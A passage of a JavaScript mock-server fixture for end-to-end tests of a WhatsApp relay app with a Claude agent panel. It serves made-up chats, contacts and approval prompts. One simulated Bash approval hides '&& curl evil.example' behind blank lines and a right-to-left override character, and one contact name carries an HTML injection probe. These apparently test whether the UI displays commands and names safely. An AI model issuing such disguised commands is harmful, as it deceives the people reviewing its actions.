// A stand-in for wa-relay with made-up data, for end-to-end tests of the real app. It speaks the same
// API and records what it receives, and never touches WhatsApp or Claude.
import http from "node:http";

const PNG = Buffer.from(
  "iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAAFUlEQVR42mNkYPj/n4EIwMRIJBhVSAwAVhQBEhQmF1wAAAAASUVORK5CYII=",
  "base64",
);
const THUMB = PNG.toString("base64");

const DM = "15550000001@s.whatsapp.net";
const LID = "99999@lid";
const DM2 = "15550000002@s.whatsapp.net";
const GROUP = "120363000000000001@g.us";

// Made-up people and groups for the README screenshots (e2e/readme-shots.mjs). Nobody here is real.
const SHOW_PEOPLE = [
  ["15550100001", "Maya Chen"],
  ["15550100002", "Daniel Okafor"],
  ["15550100003", "Priya Raman"],
  ["15550100004", "Tom Becker"],
  ["15550100005", "Sofia Alvarez"],
  ["15550100006", "Jonas Weber"],
  ["15550100007", "Aisha Karimi"],
  ["15550100008", "Marco Rossi"],
].map(([n, name]) => ({ jid: `${n}@s.whatsapp.net`, name }));
const SHOW_GROUPS = [
  { jid: "120363555000000001@g.us", name: "Weekend Hikers" },
  { jid: "120363555000000002@g.us", name: "Kitchen Reno" },
  { jid: "120363555000000003@g.us", name: "Product Launch" },
  { jid: "120363555000000004@g.us", name: "Book Club" },
  { jid: "120363555000000005@g.us", name: "Family" },
];

export function makeRelay({ showcase = false } = {}) {
  const log = { requests: [], sent: [], read: [], uploads: {}, finished: [], assign: [], approvals: [], claude: [], updateChecks: 0, updateDownloads: 0 };
  let update = null;
  let outage = "";
  const results = { drop: false, delay: 60 };
  let failReads = 0; // when set, /api/read answers with this status
  const pictures = new Map();
  const ownPictures = new Set();
  // A real 2x2 JPEG, standing in for what the home PC sends after re-encoding.
  const JPEG = Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/wAALCAACAAIBAREA/8QAFAABAAAAAAAAAAAAAAAAAAAACP/EABQQAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQEAAD8AVN//2Q==", "base64");
  let status = { connected: true, logged_in: true };
  let seq = 0;
  const messages = [];
  const chats = new Map();
  let requireCookie = true;
  let forceRelogin = false;
  let loginDelayed = true;
  const subs = new Set();
  const groups = {
    type: "groups",
    groups: [
      { id: "personal", name: "Personal", color: "#2f9e6e", order: 0 },
      { id: "work", name: "Work", color: "#3b7ddd", order: 1 },
    ],
    assign: {},
  };
  // What WhatsApp would say about a group, set by a test. Unsure by default, as the real one can be.
  const groupFacts = { access: { can_change: false, why: "unknown" }, members: [], membersFail: false, photoError: null };
  const threads = new Map();
  const names = new Map();
  const cards = new Map();
  const docBytes = new Map();
  const cardLog = [];
  const mediaPolls = new Map();

  const now = Date.now();
  function addChat(jid, name, last, read) {
    chats.set(jid, { seq: ++seq, jid, name, last_ms: last, last_read_ms: read });
  }
  function addMsg(m) {
    const row = {
      seq: ++seq,
      sender: m.chat.split("@")[0],
      sender_jid: "",
      push_name: "",
      text: "",
      from_me: false,
      media: "",
      filename: "",
      mime: "",
      size: 0,
      status: "",
      ...m,
    };
    const at = messages.findIndex((x) => x.id === row.id && x.chat === row.chat);
    if (at >= 0) messages[at] = row;
    else messages.push(row);
    return row;
  }

  if (showcase) {
    const min = 60000;
    const [maya, daniel, priya, tom, sofia, jonas, aisha, marco] = SHOW_PEOPLE;
    const [hikers, reno, launch, books, family] = SHOW_GROUPS;
    const me = "15559990000";
    const from = (p) => ({ sender: p.jid.split("@")[0], sender_jid: p.jid, push_name: p.name.split(" ")[0] });
    const mine = { from_me: true, status: "read", sender: me };
    // Newest first in the list: [chat, name, minutes ago, unread?]
    const list = [
      [hikers, 2, true],
      [maya, 9, true],
      [launch, 25, false],
      [daniel, 48, false],
      [reno, 95, true],
      [priya, 160, false],
      [books, 300, false],
      [tom, 600, false],
      [family, 900, false],
      [sofia, 1500, false],
      [jonas, 2900, false],
      [aisha, 4400, false],
      [marco, 7300, false],
    ];
    for (const [c, ago, unread] of list) addChat(c.jid, c.name, now - ago * min, unread ? now - (ago + 30) * min : now);
    const say = (chat, id, ago, text, extra = {}) => addMsg({ id, chat: chat.jid, text, ts: now - ago * min, ...extra });
    // The open conversation.
    say(hikers, "h1", 75, "Who's in for Saturday? Thinking the ridge trail, about 12 km.", from(maya));
    say(hikers, "h2", 70, "In! What time are we starting?", from(daniel));
    say(hikers, "h3", 66, "8:00 at the north trailhead, so we beat the heat", mine);
    say(hikers, "h4", 60, "I'll bring snacks and the first aid kit", { ...from(priya), reactions: { [maya.jid]: "🙌", me: "👍" } });
    say(hikers, "h5", 41, "Forecast says *sunny* and 22°, perfect", from(tom));
    say(hikers, "h6", 30, "Can someone give me a lift? My car's in the shop", from(sofia));
    say(hikers, "h7", 24, "Sure, I'll pick you up at 7:30", { ...mine, quoted_id: "h6", quoted_text: "Can someone give me a lift? My car's in the shop", quoted_sender: sofia.jid });
    say(hikers, "h8", 6, "Map of the loop: https://example.com/ridge-trail", from(maya));
    say(hikers, "h9", 2, "See everyone Saturday! 🥾", from(daniel));
    // Last message in every other chat.
    say(maya, "m1", 9, "Did you get the tickets for Friday?");
    say(launch, "l1", 25, "Slides are final, sending them to the team now", from(aisha));
    say(daniel, "d1", 48, "Thanks for dinner last night!", mine);
    say(reno, "r1", 95, "The cabinets arrive Tuesday morning", from(jonas));
    say(priya, "p1", 160, "Running 10 minutes late, sorry!");
    say(books, "b1", 300, "Next month's pick: a mystery, your call", from(sofia));
    say(tom, "t1", 600, "Sounds good 👍", mine);
    say(family, "f1", 900, "Happy birthday Grandpa! 🎉", from(marco));
    say(sofia, "s1", 1500, "Can you send me that recipe?");
    say(jonas, "j1", 2900, "Invoice paid, thanks", mine);
    say(aisha, "a1", 4400, "Great meeting today");
    say(marco, "x1", 7300, "Photos from the trip are up");
    groups.assign = Object.fromEntries([
      ...[hikers, books, family, maya, daniel, priya, tom, sofia, marco].map((c) => [c.jid, "personal"]),
      ...[launch, reno, jonas, aisha].map((c) => [c.jid, "work"]),
    ]);
  } else {
  addChat(DM, "15550000001", now - 60000, now - 300000);
  addChat(LID, "", now - 30000, now - 300000);
  addChat(DM2, "Bob Plumber", now - 7200000, now);
  addChat(GROUP, "Bingo Committee", now - 3600000, now);
  addMsg({ id: "a1", chat: DM, text: "Are we still on for the substation visit?", ts: now - 86400000 });
  addMsg({ id: "a2", chat: DM, text: "Yes, 9am works", ts: now - 86000000, from_me: true, status: "read", sender: "15559990000" });
  addMsg({ id: "a3", chat: DM, text: "Bring the relay test set please", ts: now - 60000, quoted_id: "a2", quoted_text: "Yes, 9am works", quoted_sender: "15559990000@s.whatsapp.net" });
  addMsg({ id: "a4", chat: LID, text: "Sent from my other address, see https://example.com/report.pdf", ts: now - 30000 });
  addMsg({ id: "b1", chat: DM2, text: "Invoice attached", ts: now - 7200000 });
  addMsg({ id: "b2", chat: DM2, text: "", ts: now - 7199000, media: "document", filename: "invoice 4471.pdf", mime: "application/pdf", size: 5000 });
  addMsg({ id: "g1", chat: GROUP, text: "*Reminder* the _draw_ is Friday", ts: now - 3700000, sender: "15550000001", sender_jid: DM, push_name: "Sample" });
  addMsg({ id: "g2", chat: GROUP, text: "Photo from last week", ts: now - 3650000, media: "image", mime: "image/png", size: PNG.length, width: 300, height: 200, thumb: THUMB, filename: "image_g2.png", sender: "15550000002", sender_jid: DM2 });
  addMsg({ id: "g3", chat: GROUP, text: "Old row with no real sender", ts: now - 3640000, sender: GROUP.split("@")[0] });
  addMsg({ id: "g4", chat: GROUP, text: "", ts: now - 3630000, media: "video", mime: "video/mp4", size: 900000, width: 640, height: 360, seconds: 12, thumb: THUMB, filename: "video_g4.mp4", sender: "15550000002", sender_jid: DM2 });
  addMsg({ id: "g5", chat: GROUP, text: "", ts: now - 3620000, media: "document", filename: "run-me.exe", mime: "application/octet-stream", size: 2048, sender: "15550000002", sender_jid: DM2 });
  addMsg({ id: "g6", chat: GROUP, text: "See you all there", ts: now - 3600000, from_me: true, status: "delivered", sender: "15559990000", reactions: { "15550000001@s.whatsapp.net": "👍", me: "❤️" } });
  for (let i = 0; i < 180; i++) {
    addMsg({ id: `h${i}`, chat: DM2, text: `Older message number ${i} about the job`, ts: now - 90000000 - i * 60000 });
  }
  }

  function publish(obj) {
    const data = `data: ${JSON.stringify(obj)}\n\n`;
    for (const res of subs) res.write(data);
  }

  function live(msg) {
    const prev = seq;
    const row = addMsg(msg);
    publish({ type: "delta", prev, seq, messages: [row], chats: [] });
    return row;
  }

  function json(res, status, body) {
    res.writeHead(status, { "content-type": "application/json" });
    res.end(JSON.stringify(body));
  }

  function readBody(req) {
    return new Promise((resolve) => {
      const parts = [];
      req.on("data", (c) => parts.push(c));
      req.on("end", () => resolve(Buffer.concat(parts)));
    });
  }

  async function claudeRoute(req, res, path, method) {
    if (method === "GET" && path === "/status") return json(res, 200, { signed_in: true, approval_timeout_minutes: 10, allowed_tools: ["Read"] });
    if (method === "GET" && path === "/projects") return json(res, 200, { projects: ["C:\\Users\\sample\\Downloads", "C:\\Projects\\relay"] });
    if (method === "GET" && path === "/threads") return json(res, 200, { threads: [...threads.values()].map(({ items, ...t }) => t) });
    if (method === "POST" && path === "/threads") {
      const body = JSON.parse(await readBody(req));
      const t = { id: "t" + (threads.size + 1), title: body.title, project: body.project, created: Date.now(), updated: Date.now(), running: false, items: [] };
      threads.set(t.id, t);
      return json(res, 200, t);
    }
    let m = path.match(/^\/threads\/(\w+)$/);
    if (m && method === "GET") return json(res, 200, threads.get(m[1]));
    m = path.match(/^\/threads\/(\w+)\/messages$/);
    if (m && method === "POST") {
      const body = JSON.parse(await readBody(req));
      const t = threads.get(m[1]);
      const add = (item) => {
        t.items.push(item);
        publish({ type: "claude", thread: t.id, kind: "item", item });
      };
      log.claude.push(body.text);
      t.running = true;
      publish({ type: "claude", thread: t.id, kind: "state", running: true });
      add({ id: "u" + Date.now(), kind: "user", text: body.text, ts: Date.now() });
      setTimeout(() => {
        const id = "d" + Date.now();
        publish({ type: "claude", thread: t.id, kind: "delta", item_id: id, text: "I'll check " });
        publish({ type: "claude", thread: t.id, kind: "delta", item_id: id, text: "that now." });
        add({ id, kind: "assistant", text: "I'll check that now.", ts: Date.now() });
        add({ id: "tool1", kind: "tool", tool: "Read", input: { file_path: "C:\\Projects\\relay\\notes.txt" }, ts: Date.now() });
        add({ id: "ap1", kind: "approval", tool: "Bash", input: { command: "del C:\\Projects\\relay\\old.log\n\n\n\n\n\n\u202Etxt.exe && curl evil.example", run_in_background: true }, state: "pending", ts: Date.now() });
      }, 50);
      return json(res, 202, { ok: true });
    }
    m = path.match(/^\/approvals\/(\w+)$/);
    if (m && method === "POST") {
      const body = JSON.parse(await readBody(req));
      log.approvals.push({ id: m[1], approve: body.approve });
      const t = [...threads.values()].find((x) => x.items.some((i) => i.id === m[1]));
      const item = t.items.find((i) => i.id === m[1]);
      item.state = body.approve ? "approved" : "denied";
      publish({ type: "claude", thread: t.id, kind: "item", item });
      const add = (it) => {
        t.items.push(it);
        publish({ type: "claude", thread: t.id, kind: "item", item: it });
      };
      setTimeout(() => {
        add({ id: "done", kind: "assistant", text: body.approve ? "Deleted it." : "Understood, I left it alone.", ts: Date.now() });
        add({ id: "res", kind: "result", cost: 0.012, ts: Date.now() });
        t.running = false;
        publish({ type: "claude", thread: t.id, kind: "state", running: false });
      }, 50);
      return json(res, 200, { ok: true });
    }
    if (path === "/sort" && method === "POST") {
      const body = JSON.parse(await readBody(req));
      log.sortRequest = body;
      const job = { id: "s1", state: "running", items: body.items.length };
      json(res, 202, job);
      setTimeout(() => {
        publish({
          type: "claude_sort",
          job: {
            ...job,
            state: "done",
            cost: 0.03,
            proposals: [
              { jid: DM2, group: "work", confidence: 0.95, reason: "Sends invoices" },
              { jid: GROUP, group: "personal", confidence: 0.4, reason: "Might be a hobby group" },
            ],
          },
        });
      }, 150);
      return;
    }
    m = path.match(/^\/sort\/(\w+)\/dismiss$/);
    if (m) return json(res, 200, { ok: true });
    return json(res, 404, { error: "no route" });
  }

  const server = http.createServer(async (req, res) => {
    const url = new URL(req.url, "http://x");
    const path = url.pathname;
    const method = req.method;

    if (path === "/login-ok") {
      // The first visit stands in for the sign-in page, so a test can look at this window before it closes.
      if (loginDelayed) {
        res.writeHead(200, { "content-type": "text/html" });
        return res.end(`<!doctype html><title>PIN page</title><a id="go" href="/login-ok?done=1">Enter PIN</a>`);
      }
      res.writeHead(200, { "content-type": "text/html", "set-cookie": "CF_Authorization=test-login; Max-Age=2592000; HttpOnly; Path=/; SameSite=Lax" });
      return res.end("<!doctype html><title>Signed in</title>Signed in.");
    }

    log.requests.push({ method, path, cookie: req.headers.cookie, client: req.headers["x-wa-client"], origin: req.headers.origin, agent: req.headers["user-agent"] });
    if (!path.startsWith("/control/")) {
      if (requireCookie && !(req.headers.cookie ?? "").includes("CF_Authorization=test-login")) {
        res.writeHead(302, { location: "https://example-team.cloudflareaccess.com/" });
        return res.end();
      }
      if (forceRelogin) {
        res.writeHead(302, { location: "https://example-team.cloudflareaccess.com/" });
        return res.end();
      }
      if (req.headers["x-wa-client"] !== "1" || req.headers.origin) return json(res, 403, { error: "Forbidden" });
    }

    if (!path.startsWith("/control/") && outage) {
      if (outage === "refuse") return req.socket.destroy();
      if (outage === "silent") return; // Accepted, and never answered.
      if (outage === "502") return json(res, 502, { ok: false, error: "That service isn't running on your home PC." });
      res.writeHead(530, { "content-type": "text/html" });
      return res.end("<!doctype html><title>Error 1033</title>Cloudflare Tunnel error");
    }
    if (path === "/api/group/create") {
      const body = JSON.parse(await readBody(req));
      log.groupCreates = [...(log.groupCreates ?? []), body];
      if (groupFacts.createError) return json(res, groupFacts.createError.status, { ok: false, error: groupFacts.createError.error });
      const jid = `120363777000000${String(log.groupCreates.length).padStart(4, "0")}@g.us`;
      const notAdded = groupFacts.notAdded ?? [];
      return json(res, 200, { ok: true, jid, name: body.name, added: body.members.filter((m) => !notAdded.some((n) => n.jid === m)), not_added: notAdded });
    }
    if (path === "/api/group/rename" || path === "/api/group/leave") {
      const jid = url.searchParams.get("jid");
      const action = path.split("/").pop();
      const body = JSON.parse((await readBody(req)).toString() || "{}");
      log.groupActions = [...(log.groupActions ?? []), { action, jid, name: body.name }];
      const refusal = groupFacts.actionError;
      if (refusal) return json(res, refusal.status, { ok: false, error: refusal.error });
      if (action === "rename") {
        const chat = chats.get(jid);
        chat.name = body.name;
        chat.seq = ++seq;
        publish({ type: "delta", prev: seq - 1, seq, messages: [], chats: [chat] });
        return json(res, 200, { ok: true, jid, name: body.name, changed: true });
      }
      groupFacts.access = { can_change: false, why: "not_member" };
      publish({ type: "group_members", jid });
      return json(res, 200, { ok: true, jid });
    }
    if (path === "/api/group/members") {
      log.membersGets = (log.membersGets ?? 0) + 1;
      if (groupFacts.membersFail) return json(res, 503, { ok: false, error: "Couldn't get this group's members from WhatsApp." });
      return json(res, 200, { ok: true, jid: url.searchParams.get("jid"), members: groupFacts.members });
    }
    if (path === "/api/picture/group-access") return json(res, 200, groupFacts.access);
    if (path === "/api/picture/group") {
      const jid = url.searchParams.get("jid");
      const body = await readBody(req);
      log.groupPhotos = [...(log.groupPhotos ?? []), { jid, bytes: body.length }];
      if (groupFacts.photoError) return json(res, groupFacts.photoError.status, { ok: false, error: groupFacts.photoError.error });
      return json(res, 200, { ok: true, jid, picture_id: "made-up", custom_showing: ownPictures.has(jid) });
    }
    if (path === "/api/pictures") return json(res, 200, { pictures: Object.fromEntries(pictures), own: [...ownPictures] });
    if (path === "/api/picture") {
      log.pictureGets = (log.pictureGets ?? 0) + 1;
      if (!pictures.has(url.searchParams.get("jid"))) {
        res.writeHead(204);
        return res.end();
      }
      res.writeHead(200, { "content-type": "image/jpeg", "x-picture-version": String(pictures.get(url.searchParams.get("jid"))) });
      return res.end(JPEG);
    }
    if (path === "/api/picture/own") {
      const jid = url.searchParams.get("jid");
      const body = await readBody(req);
      log.pictureWrites = [...(log.pictureWrites ?? []), { method, jid, bytes: body.length }];
      if (method === "POST") {
        pictures.set(jid, Date.now());
        ownPictures.add(jid);
      } else {
        pictures.delete(jid);
        ownPictures.delete(jid);
      }
      publish({ type: "picture", jid, v: Date.now(), own: method === "POST" });
      return json(res, 200, { ok: true, jid, v: Date.now(), changed: true });
    }
    if (path === "/api/update/latest") {
      log.updateChecks++;
      if (!update) {
        res.writeHead(204);
        return res.end();
      }
      return json(res, 200, { version: update.version, signature: update.signature, file: update.file });
    }
    if (path.startsWith("/api/update/installer/")) {
      log.updateDownloads++;
      if (update?.lapse) {
        res.writeHead(302, { location: "https://example-team.cloudflareaccess.com/" });
        return res.end();
      }
      if (!update || decodeURIComponent(path.slice("/api/update/installer/".length)) !== update.file) return json(res, 404, { error: "no such file" });
      res.writeHead(200, { "content-type": "application/octet-stream", "content-length": update.bytes.length });
      return res.end(update.bytes);
    }
    if (path === "/api/events") {
      res.writeHead(200, { "content-type": "text/event-stream" });
      res.write(`data: ${JSON.stringify({ type: "status", ...status, head: seq })}\n\n`);
      res.write(`data: ${JSON.stringify({ type: "claude_status", up: true })}\n\n`);
      subs.add(res);
      req.on("close", () => subs.delete(res));
      return;
    }
    if (path === "/api/sync") {
      const after = Number(url.searchParams.get("after") ?? 0);
      const limit = Number(url.searchParams.get("limit") ?? 500);
      const pendingMsgs = messages.filter((m) => m.seq > after).sort((a, b) => a.seq - b.seq);
      const page = pendingMsgs.slice(0, limit);
      const upto = pendingMsgs.length > limit ? page[page.length - 1].seq : seq;
      const pageChats = [...chats.values()].filter((c) => c.seq > after && c.seq <= upto);
      return json(res, 200, { messages: page, chats: pageChats, next: upto, head: seq, more: upto < seq });
    }
    if (path === "/api/name") {
      if (method === "POST") {
        const body = JSON.parse(await readBody(req));
        log.names = [...(log.names ?? []), { set: body.jid, name: body.name }];
        names.set(body.jid, body.name);
        publish({ type: "contacts" });
        return json(res, 200, { ok: true, jid: body.jid, name: body.name });
      }
      const jid = url.searchParams.get("jid");
      log.names = [...(log.names ?? []), { removed: jid }];
      const changed = names.delete(jid);
      publish({ type: "contacts" });
      return json(res, 200, { ok: true, changed });
    }
    if (path === "/api/contacts") {
      const named = (contacts) => [...contacts.filter((c) => !names.has(c.jid)), ...contacts.filter((c) => names.has(c.jid)).map((c) => ({ ...c, full_name: names.get(c.jid) })), ...[...names].filter(([jid]) => !contacts.some((c) => c.jid === jid)).map(([jid, full_name]) => ({ jid, full_name }))];
      if (showcase) return json(res, 200, { contacts: SHOW_PEOPLE.map((p) => ({ jid: p.jid, full_name: p.name })), aliases: [] });
      return json(res, 200, {
        contacts: named([
          { jid: DM, full_name: "Sample Person" },
          { jid: DM2, full_name: "Bob Plumber" },
          { jid: "15550000003@s.whatsapp.net", full_name: "Carol NoChat" },
          { jid: "15550000004@s.whatsapp.net", full_name: "Dana Saved (Made-up)" },
          { jid: "777777777@lid", push_name: "Dana" },
          { jid: "15550000005@s.whatsapp.net", full_name: "<b>Eve</b> &amp; <img src=x>" },
          { jid: "15550000006@s.whatsapp.net", full_name: "A very long made-up name ".repeat(12).trim() },
        ]),
        aliases: [[LID, DM], ["777777777@lid", "15550000004@s.whatsapp.net"]],
      });
    }
    if (path === "/api/groups" && method === "GET") return json(res, 200, groups);
    if (path === "/api/groups" && method === "POST") {
      const body = JSON.parse(await readBody(req));
      groups.groups = [...groups.groups, { id: 'g' + (groups.groups.length + 100), name: body.name, color: body.color ?? '#8a6fd1', order: groups.groups.length }];
      publish(groups);
      return json(res, 200, groups);
    }
    if (path === "/api/assign" && method === "POST") {
      const body = JSON.parse(await readBody(req));
      log.assign.push(body);
      for (const jid of body.jids) {
        if (body.group) groups.assign[jid] = body.group;
        else delete groups.assign[jid];
      }
      publish(groups);
      return json(res, 200, groups);
    }
    if (path === "/api/send" && method === "POST") {
      const body = JSON.parse(await readBody(req));
      log.sent.push(body);
      if (body.quote?.id === "g3") return json(res, 409, { ok: false, error: "This message has no sender recorded, so it can't be quoted. Send it without the reply." });
      const row = live({ id: "s" + log.sent.length, chat: body.chat, text: body.text, ts: Date.now(), from_me: true, status: "sent", sender: "15559990000", quoted_id: body.quote?.id ?? "", quoted_text: body.quote?.text ?? "" });
      return json(res, 200, { ok: true, message: row });
    }
    if (["/api/edit", "/api/revoke", "/api/hide"].includes(path) && method === "POST") {
      const body = JSON.parse(await readBody(req));
      log.changes = [...(log.changes ?? []), { path, ...body }];
      const found = messages.find((x) => x.id === body.id && x.chat === body.chat);
      if (!found) return json(res, 404, { ok: false, error: "That message isn't stored here." });
      const { seq: _old, ...m } = found;
      if (path === "/api/hide") {
        live({ ...m, hidden: true });
        return json(res, 200, { ok: true });
      }
      if (!m.from_me) return json(res, 409, { ok: false, error: path === "/api/edit" ? "You can only edit your own messages." : "You can only delete your own messages for everyone." });
      if (path === "/api/edit") {
        if (Date.now() - m.ts > 15 * 60000) return json(res, 409, { ok: false, error: "WhatsApp only allows editing for 15 minutes after sending." });
        return json(res, 200, { ok: true, message: live({ ...m, text: body.text, edited_ms: Date.now() }) });
      }
      if (Date.now() - m.ts > 60 * 3600000) return json(res, 409, { ok: false, error: "WhatsApp only allows deleting for everyone for about 2 days after sending." });
      return json(res, 200, { ok: true, message: live({ ...m, text: "", media: "", revoked: true }) });
    }
    if (path === "/api/forward" && method === "POST") {
      const body = JSON.parse(await readBody(req));
      log.forwards = [...(log.forwards ?? []), body];
      const m = messages.find((x) => x.id === body.id && x.chat === body.chat);
      if (!m) return json(res, 404, { ok: false, error: "That message isn't stored here." });
      if (!body.to?.length || body.to.length > 5) return json(res, 400, { ok: false, error: "You can forward to up to 5 chats at a time, as on WhatsApp." });
      const room = groupFacts.forwardRoom ?? 99;
      const allowed = body.to.slice(0, room);
      const limited = body.to.slice(room);
      json(res, 202, { ok: true, state: "sending", limited });
      setTimeout(() => {
        for (const to of allowed) live({ id: `fw${log.forwards.length}-${to}`, chat: to, text: m.text, media: m.media, filename: m.filename, ts: Date.now(), from_me: true, status: "sent", sender: "15559990000" });
        publish({ type: "forward_result", client_id: body.client_id, ok: limited.length === 0, sent: allowed, failed: [], limited });
      }, 150);
      return;
    }
    // Contact cards, with the bridge's rules: versions, one card per person, the name passed on, and a log.
    if (path.startsWith("/api/cards")) {
      const digits = (v) => {
        const d = String(v).replace(/\D/g, "");
        return String(v).trim().startsWith("+") ? d : d.length === 10 ? "1" + d : d;
      };
      const people = { [digits(DM)]: DM, [digits(DM2)]: DM2 };
      const known = { [DM]: "Sample Person", [DM2]: "Bob Plumber" };
      const changed = (before, after, action) => {
        cardLog.push({ seq: cardLog.length + 1, at_ms: Date.now(), who: "app:user@example.com", action, id: (after ?? before).id, before, after });
        for (const l of before?.links ?? []) if (!after?.links?.includes(l) && names.get(l) === before.display) names.delete(l);
        for (const l of after?.links ?? []) names.set(l, after.display);
        publish({ type: "cards" });
        publish({ type: "contacts" });
      };
      const tidy = (c) => {
        const out = structuredClone(c);
        out.display = (out.display ?? "").trim() || [out.name?.given, out.name?.family].filter(Boolean).join(" ") || out.company || out.emails?.[0]?.value || out.phones?.[0]?.value || "";
        return out;
      };
      if (path === "/api/cards" && method === "GET") {
        if (outage) return;
        return json(res, 200, { cards: [...cards.values()], rev: cardLog.length });
      }
      const body = method === "POST" ? JSON.parse((await readBody(req)) || "{}") : {};
      log.cards = [...(log.cards ?? []), { path, body }];
      if (path === "/api/cards/save") {
        const card = tidy(body.card);
        if (!card.display) return json(res, 400, { ok: false, error: "a card needs a name, or at least a company, email or phone number" });
        for (const l of card.links ?? []) {
          const owner = [...cards.values()].find((c) => c.id !== card.id && c.links?.includes(l));
          if (owner) return json(res, 400, { ok: false, error: `${l} is already linked to ${owner.display}. Unlink it there first` });
        }
        const before = card.id ? cards.get(card.id) : undefined;
        if (card.id && !before) return json(res, 404, { ok: false, error: "That card doesn't exist any more." });
        if (before && before.version !== body.expect_version) return json(res, 409, { ok: false, error: "This card was changed somewhere else since you opened it. Close it and open it again to see the latest." });
        if (!card.id) card.id = `card${cards.size + cardLog.length + 1}`.padEnd(24, "0");
        card.version = (before?.version ?? 0) + 1;
        cards.set(card.id, card);
        changed(before, card, before ? "update" : "create");
        return json(res, 200, { ok: true, card });
      }
      if (path === "/api/cards/delete") {
        const before = cards.get(body.id);
        if (!before) return json(res, 404, { ok: false, error: "That card doesn't exist any more." });
        cards.delete(body.id);
        changed(before, null, "delete");
        return json(res, 200, { ok: true });
      }
      if (path === "/api/cards/history") {
        if (url.searchParams.has("deleted")) {
          const latest = new Map();
          for (const e of cardLog) latest.set(e.id, e);
          return json(res, 200, { entries: [...latest.values()].filter((e) => !e.after && e.before && !cards.has(e.id)).reverse() });
        }
        return json(res, 200, { entries: cardLog.filter((e) => e.id === url.searchParams.get("id")).reverse() });
      }
      if (path === "/api/cards/undo") {
        const entry = cardLog.find((e) => e.seq === body.seq);
        const current = cards.get(entry.id);
        if (!entry.before) {
          cards.delete(entry.id);
          changed(current, null, "undo");
          return json(res, 200, { ok: true, card: null });
        }
        const back = { ...structuredClone(entry.before), version: (current?.version ?? entry.before.version) + 1 };
        cards.set(back.id, back);
        changed(current, back, "undo");
        return json(res, 200, { ok: true, card: back });
      }
      if (path === "/api/cards/suggest") {
        const out = [];
        for (const ph of body.phones ?? []) {
          const jid = people[digits(ph.value)];
          if (jid && !body.links?.includes(jid)) out.push({ jid, name: known[jid], why: "same number" });
        }
        for (const [jid, name] of Object.entries(known)) {
          if (name.toLowerCase() === (body.display ?? "").toLowerCase() && !out.some((s) => s.jid === jid) && !body.links?.includes(jid)) out.push({ jid, name, why: "same name only" });
        }
        return json(res, 200, { suggestions: out });
      }
      if (path === "/api/cards/import") {
        const items = [];
        let added = 0;
        let updated = 0;
        body.cards.forEach((raw, index) => {
          const c = tidy(raw);
          if (!c.display || (c.emails ?? []).some((e) => !e.value.includes("@"))) return items.push({ index, kind: "invalid", display: c.display, error: "doesn't look like an email address" });
          const matches = [...cards.values()].filter((have) =>
            (have.emails ?? []).some((e) => (c.emails ?? []).some((x) => x.value.toLowerCase() === e.value.toLowerCase())) ||
            (have.phones ?? []).some((e) => (c.phones ?? []).some((x) => digits(x.value) === digits(e.value))));
          const choice = (body.choices ?? []).find((x) => x.index === index) ?? {};
          if (matches.length === 0) {
            const links = body.link_exact ? (c.phones ?? []).map((ph) => people[digits(ph.value)]).filter((j) => j && ![...cards.values()].some((k) => k.links?.includes(j))) : [];
            items.push({ index, kind: "new", display: c.display, links });
            if (body.apply && choice.action !== "skip") {
              const card = { ...c, id: `imp${index}${Date.now()}`.padEnd(24, "0"), version: 1, links };
              cards.set(card.id, card);
              changed(undefined, card, "import");
              added++;
            }
          } else if (matches.length === 1) {
            const have = matches[0];
            const conflicts = ["company", "title"].filter((f) => c[f] && have[f] && c[f] !== have[f]).map((f) => ({ field: f, existing: have[f], incoming: c[f] }));
            const adds = (c.phones ?? []).some((x) => !(have.phones ?? []).some((e) => digits(e.value) === digits(x.value))) ? ["phones"] : [];
            items.push({ index, kind: "merge", display: c.display, match_id: have.id, match_name: have.display, adds, conflicts });
            if (body.apply && choice.action !== "skip") {
              const next = structuredClone(have);
              for (const f of choice.take ?? []) next[f] = c[f];
              if (adds.length) next.phones = [...(next.phones ?? []), ...(c.phones ?? []).filter((x) => !(have.phones ?? []).some((e) => digits(e.value) === digits(x.value)))];
              next.version++;
              cards.set(next.id, next);
              changed(have, next, "import");
              updated++;
            }
          } else {
            items.push({ index, kind: "ambiguous", display: c.display, matches: matches.map((m) => m.display) });
          }
        });
        return json(res, 200, { ok: true, items, added, updated });
      }
    }
    if (path === "/api/read" && method === "POST") {
      const body = JSON.parse(await readBody(req));
      log.readTries = (log.readTries ?? 0) + 1;
      if (failReads) return json(res, failReads, { ok: false, error: "made-up failure" });
      log.read.push(body);
      return json(res, 200, { ok: true });
    }
    if (path === "/api/react" && method === "POST") {
      log.react = JSON.parse(await readBody(req));
      return json(res, 200, { ok: true });
    }
    if (path === "/api/media" && docBytes.has(url.searchParams.get("id"))) {
      const body = docBytes.get(url.searchParams.get("id"));
      res.writeHead(200, { "content-type": "application/octet-stream", "content-length": body.length });
      return res.end(body);
    }
    if (path === "/control/doc") {
      const body = JSON.parse(await readBody(req));
      const bytes = Buffer.from(body.base64, "base64");
      docBytes.set(body.id, bytes);
      return json(res, 200, live({ id: body.id, chat: body.chat, text: body.caption ?? "", ts: body.ts ?? Date.now(), media: "document", filename: body.filename, mime: body.mime, size: body.size ?? bytes.length, sender: "15550000001", sender_jid: "15550000001@s.whatsapp.net" }));
    }
    if (path === "/api/media") {
      const id = url.searchParams.get("id");
      const polls = mediaPolls.get(id) ?? 0;
      mediaPolls.set(id, polls + 1);
      if (polls === 0) return json(res, 202, { ok: true, state: "downloading" });
      if (id === "g4") return json(res, 410, { ok: false, error: "This media is no longer on the phone." });
      const body = id === "g5" ? Buffer.alloc(2048, 7) : id === "b2" ? Buffer.alloc(5000, 1) : PNG;
      const type = id === "g2" ? "image/png" : "application/octet-stream";
      res.writeHead(200, { "content-type": type, "content-length": body.length });
      return res.end(body);
    }
    let m = path.match(/^\/api\/upload\/([\w-]+)$/);
    if (m && method === "PUT") {
      const body = await readBody(req);
      const offset = Number(url.searchParams.get("offset"));
      const have = log.uploads[m[1]]?.length ?? 0;
      if (offset !== have) return json(res, 409, { ok: false, size: have });
      log.uploads[m[1]] = Buffer.concat([log.uploads[m[1]] ?? Buffer.alloc(0), body]);
      return json(res, 200, { ok: true, size: log.uploads[m[1]].length });
    }
    if (m && method === "GET") return json(res, 200, { ok: true, size: log.uploads[m[1]]?.length ?? 0 });
